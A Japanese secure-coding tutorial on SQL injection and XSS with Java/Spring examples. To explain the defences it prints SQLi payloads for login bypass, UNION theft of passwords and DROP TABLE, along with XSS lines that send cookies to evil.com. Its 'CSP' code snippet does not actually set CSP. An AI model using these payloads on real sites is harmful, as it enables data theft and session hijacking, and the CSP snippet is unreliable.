# SQLインジェクション・XSS対策

## 📚 この資料で学ぶこと
- SQLインジェクションの仕組みと対策
- XSS（クロスサイトスクリプティング）の仕組みと対策
- 入力値バリデーションの基本
- 実際の攻撃と防御のデモ

> ⏰ 想定時間：1時間

---

## 1. SQLインジェクション

### 1.1 SQLインジェクションとは

**ユーザーの入力値がSQL文にそのまま組み込まれることで、意図しないSQLが実行される脆弱性**です。

```
正常なリクエスト：
ユーザー名：tanaka
→ SELECT * FROM users WHERE name = 'tanaka'
→ 田中さんのデータが返る ✅

攻撃リクエスト：
ユーザー名：' OR '1'='1
→ SELECT * FROM users WHERE name = '' OR '1'='1'
→ 全ユーザーのデータが返る！❌
```

### 1.2 攻撃の種類

#### パターン1：認証バイパス

```java
// ❌ 脆弱なログイン処理
String sql = "SELECT * FROM users WHERE username = '" + username 
           + "' AND password = '" + password + "'";

// 攻撃者の入力
// username: admin' --
// password: anything

// 実行されるSQL
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
//                                            ↑ 以降はコメントアウト！
// → パスワードチェックなしでadminとしてログイン成功！
```

#### パターン2：データの窃取（UNION攻撃）

```sql
-- 攻撃者の入力: ' UNION SELECT id, email, password FROM users --
SELECT name, description FROM products WHERE id = '' 
UNION SELECT id, email, password FROM users --'

-- → 商品データに加えて、全ユーザーのメール・パスワードが取得される！
```

#### パターン3：データの破壊

```sql
-- 攻撃者の入力: '; DROP TABLE users; --
SELECT * FROM users WHERE name = ''; DROP TABLE users; --'

-- → usersテーブルが削除される！
```

#### パターン4：ブラインドSQLインジェクション

```sql
-- レスポンスの違いから情報を推測する
-- 攻撃者の入力: ' AND (SELECT LENGTH(password) FROM users WHERE username='admin') = 8 --
-- → レスポンスの違いでパスワードの長さがわかる

-- 1文字ずつ特定
-- ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin') = 'a' --
```

### 1.3 対策方法

#### 対策1：プリペアドステートメント（パラメータ化クエリ）**最重要**

```java
// ❌ 脆弱：文字列連結でSQLを組み立て
String sql = "SELECT * FROM users WHERE name = '" + name + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(sql);

// ✅ 安全：プリペアドステートメント
String sql = "SELECT * FROM users WHERE name = ?";
PreparedStatement pstmt = connection.prepareStatement(sql);
pstmt.setString(1, name);  // パラメータをバインド
ResultSet rs = pstmt.executeQuery();
// → ユーザー入力は「値」として扱われ、SQLの構造を変更できない
```

#### 対策2：ORMの活用

```java
// Spring Data JPA（推奨）
// → SQLを直接書かないため、SQLインジェクションのリスクが大幅に低減

// リポジトリ
public interface UserRepository extends JpaRepository<User, Long> {
    List<User> findByName(String name);  // 自動的にパラメータ化される
}

// JPQLのパラメータバインド
@Query("SELECT u FROM User u WHERE u.name = :name")
List<User> findByName(@Param("name") String name);  // 安全
```

#### 対策3：入力値のバリデーション

```java
// 入力値を検証する（ホワイトリスト方式）
public boolean isValidUsername(String username) {
    // 英数字とアンダースコアのみ許可
    return username.matches("^[a-zA-Z0-9_]{3,20}$");
}

// 数値が期待される場合
public boolean isValidId(String id) {
    try {
        Long.parseLong(id);
        return true;
    } catch (NumberFormatException e) {
        return false;
    }
}
```

#### 対策4：最小権限の原則

```sql
-- アプリケーション用のDBユーザーには必要最小限の権限のみ
GRANT SELECT, INSERT, UPDATE ON app_db.* TO 'app_user'@'localhost';
-- DROP TABLE や ALTER TABLE の権限は与えない！
```

### 1.4 対策の優先順位

```
防御策の優先順位：
1. 🥇 プリペアドステートメント（必須）
2. 🥈 ORMの使用（推奨）
3. 🥉 入力値のバリデーション（補助的）
4.    エスケープ処理（最終手段）
5.    WAF（Web Application Firewall）の導入
```

---

## 2. XSS（クロスサイトスクリプティング）

### 2.1 XSSとは

**Webページに悪意のあるスクリプト（JavaScript等）を注入し、他のユーザーのブラウザで実行させる攻撃**です。

```
XSSの仕組み：

1. 攻撃者がスクリプトを含む入力を送信
   名前欄に: <script>alert('XSS')</script>

2. サーバーがそのまま保存・表示
   <p>ユーザー名: <script>alert('XSS')</script></p>

3. 他のユーザーがそのページを閲覧
   → スクリプトが実行される！

被害：
├── Cookie（セッションID）の窃取
├── 偽のログインフォームの表示
├── キーロガーの仕込み
├── ページの書き換え
└── マルウェアへのリダイレクト
```

### 2.2 XSSの種類

#### 反射型XSS（Reflected XSS）

```
攻撃者が悪意のあるURLをユーザーに送る
↓
https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
↓
ユーザーがクリック → 検索結果にスクリプトが埋め込まれて実行
↓
Cookieが攻撃者のサーバーに送信される
```

```java
// ❌ 脆弱なサーバー側コード
@GetMapping("/search")
public String search(@RequestParam String q, Model model) {
    model.addAttribute("query", q);  // そのまま渡す
    return "search";
}

// search.html（脆弱）
// <p>検索結果: <span th:utext="${query}"></span></p>
// th:utext はHTMLをエスケープしない！
```

#### 格納型XSS（Stored XSS）

```
1. 攻撃者が掲示板にスクリプトを投稿
   コメント: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>

2. サーバーがDBに保存

3. 他のユーザーが掲示板を閲覧するたびにスクリプトが実行される
   → 最も危険なXSS
```

#### DOM-based XSS

```javascript
// ❌ 脆弱なJavaScriptコード
// URLパラメータをそのままDOMに挿入
const params = new URLSearchParams(location.search);
const name = params.get('name');
document.getElementById('greeting').innerHTML = 'こんにちは、' + name + 'さん';

// 攻撃URL: ?name=<img src=x onerror=alert('XSS')>
// → imgタグが挿入され、onerrorイベントでスクリプトが実行
```

### 2.3 対策方法

#### 対策1：出力エスケープ（最重要）

```java
// テンプレートエンジンの自動エスケープを活用

// Thymeleaf
// ✅ th:text（自動エスケープ）
<p th:text="${userInput}">テスト</p>
// <script>alert('XSS')</script> → &lt;script&gt;alert('XSS')&lt;/script&gt;

// ❌ th:utext（エスケープされない）
<p th:utext="${userInput}">テスト</p>
// → スクリプトがそのまま実行される！ 使用禁止！
```

```java
// 手動でエスケープする場合
import org.springframework.web.util.HtmlUtils;

String safe = HtmlUtils.htmlEscape(userInput);

// エスケープ対応表
// <  → &lt;
// >  → &gt;
// &  → &amp;
// "  → &quot;
// '  → &#39;
```

#### 対策2：CSP（Content Security Policy）ヘッダー

```java
// Spring Bootでの設定
@Configuration
public class SecurityConfig {
    @Bean
    public WebSecurityCustomizer webSecurityCustomizer() {
        // CSPヘッダーの設定
        return (web) -> web.httpFirewall(new StrictHttpFirewall());
    }
}

// レスポンスヘッダー
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'
// → 自分のドメインからのリソースのみ許可
// → インラインスクリプトの実行を禁止
```

#### 対策3：HttpOnly Cookie

```java
// CookieにHttpOnly属性を設定
// → JavaScriptからCookieにアクセスできなくなる
Cookie cookie = new Cookie("session_id", sessionId);
cookie.setHttpOnly(true);   // JavaScriptからアクセス不可
cookie.setSecure(true);     // HTTPSのみ
cookie.setPath("/");
response.addCookie(cookie);
```

#### 対策4：JavaScriptでの安全な操作

```javascript
// ❌ innerHTML（HTMLとして解釈される）
element.innerHTML = userInput;

// ✅ textContent（テキストとして扱われる）
element.textContent = userInput;

// ❌ document.write
document.write(userInput);

// ✅ DOM APIを使用
const textNode = document.createTextNode(userInput);
element.appendChild(textNode);
```

### 2.4 XSS対策のまとめ

```
XSS対策の優先順位：
1. 🥇 出力エスケープ（テンプレートエンジンの自動エスケープ）
2. 🥈 CSPヘッダーの設定
3. 🥉 HttpOnly Cookieの使用
4.    入力値のバリデーション（補助的）
5.    textContentの使用（JavaScript側）
```

---

## 3. 入力バリデーションの基本

### 3.1 バリデーションの原則

```
入力バリデーションの原則：
├── すべてのユーザー入力を検証する
├── ホワイトリスト方式（許可する形式を定義）
├── サーバーサイドで必ず検証する
│   （クライアント側の検証だけでは不十分！）
├── エラーメッセージに詳細な情報を含めない
└── バリデーションは「入力時」と「出力時」の両方で行う
```

### 3.2 Spring Bootでの実装例

```java
public class CommentForm {
    @NotBlank(message = "コメントは必須です")
    @Size(max = 500, message = "500文字以内で入力してください")
    @Pattern(regexp = "^[^<>]*$", message = "使用できない文字が含まれています")
    private String content;
    
    @NotBlank(message = "名前は必須です")
    @Size(max = 50)
    @Pattern(regexp = "^[\\p{L}\\p{N}\\s]+$", message = "使用できない文字が含まれています")
    private String authorName;
}
```

---

## 4. ハンズオン：脆弱性の確認と修正

### 4.1 脆弱なアプリケーション例

```java
// ❌ SQLインジェクションに脆弱な検索機能
@GetMapping("/search")
public List<User> search(@RequestParam String keyword) {
    String sql = "SELECT * FROM users WHERE name LIKE '%" + keyword + "%'";
    return jdbcTemplate.query(sql, new UserRowMapper());
}

// ✅ 修正版
@GetMapping("/search")
public List<User> search(@RequestParam String keyword) {
    String sql = "SELECT * FROM users WHERE name LIKE ?";
    return jdbcTemplate.query(sql, new UserRowMapper(), "%" + keyword + "%");
}
```

```html
<!-- ❌ XSSに脆弱な表示 -->
<div th:utext="${comment.content}"></div>

<!-- ✅ 修正版 -->
<div th:text="${comment.content}"></div>
```

### 4.2 セキュリティチェックリスト

```
□ SQLクエリでプリペアドステートメントを使用しているか？
□ ORMを正しく使用しているか？
□ ユーザー入力をHTMLに出力する際にエスケープしているか？
□ CSPヘッダーを設定しているか？
□ CookieにHttpOnly属性を設定しているか？
□ 入力値のバリデーションをサーバーサイドで行っているか？
□ エラーメッセージに内部情報を含めていないか？
```

---

## 📝 確認問題

1. SQLインジェクションの対策として最も重要なものは何ですか？
2. 以下のコードの脆弱性を指摘し、修正してください：
   ```java
   String sql = "SELECT * FROM products WHERE category = '" + category + "'";
   ```
3. XSSの3つの種類を説明してください
4. `th:text` と `th:utext` の違いは何ですか？どちらを使うべきですか？
5. なぜクライアント側のバリデーションだけでは不十分なのですか？

---

## 📖 参考資料
- [IPA - 安全なウェブサイトの作り方](https://www.ipa.go.jp/security/vuln/websecurity/)
- [OWASP - SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP - XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
